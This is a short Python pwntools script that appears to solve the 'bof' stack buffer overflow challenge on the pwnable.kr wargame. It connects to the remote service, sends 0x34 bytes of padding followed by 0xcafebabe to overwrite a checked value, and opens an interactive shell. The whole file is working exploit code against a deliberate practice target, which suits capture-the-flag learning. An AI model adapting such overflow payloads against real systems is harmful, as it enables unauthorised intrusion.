from pwn import *

context.log_level = 'DEBUG'

# p = process('./bof')
p = remote('pwnable.kr', 9000)

payload = 'a'*0x34 + p32(0xcafebabe)
p.sendline(payload)

p.interactive()